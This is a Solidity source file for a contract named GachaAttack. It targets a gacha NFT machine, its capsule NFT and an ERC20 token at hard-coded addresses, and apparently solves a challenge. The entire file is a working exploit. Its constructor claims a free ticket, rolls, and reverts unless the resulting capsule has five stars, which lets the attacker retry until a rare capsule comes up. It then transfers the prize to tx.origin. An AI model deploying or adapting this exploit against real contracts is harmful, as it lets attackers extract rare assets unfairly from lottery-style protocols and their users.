
pragma solidity ^0.8.0;

interface IGachaMachine {
    function checkNextFreeTicket(address _address) external view returns (uint256);
    function getFreeTicket() external;
    function roll() external;
}

interface IGachaCapsule {
    function getStars(uint256 _tokenId) external view returns (uint256); 
    function transferFrom(address from, address to, uint256 tokenId) external;
    function totalSupply() external view returns (uint256);
    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract GachaAttack {

    IGachaMachine public gmInstane = IGachaMachine(0xA882a1F41930758C86C26358a6a1bEEb0234CF40);
    IGachaCapsule public gcInstance = IGachaCapsule(0x33d9879E506a9F0Bd8dAD3a92Ffb65FedF40c8c5);
    IERC20 public gtInstance = IERC20(0xd278A7F636aA0CfeCC27C53B6475206FD9f128Fa);

    uint256 public ownTokenId;

    constructor() public {
        gmInstane.getFreeTicket();
        
        gtInstance.approve(address(gmInstane), gtInstance.balanceOf(address(this)));
        gmInstane.roll();
        ownTokenId = gcInstance.tokenOfOwnerByIndex(address(this),0);
        
        require(gcInstance.getStars(ownTokenId)==5, "Attack was not success");
        gcInstance.transferFrom(address(this), tx.origin, ownTokenId);
    }
}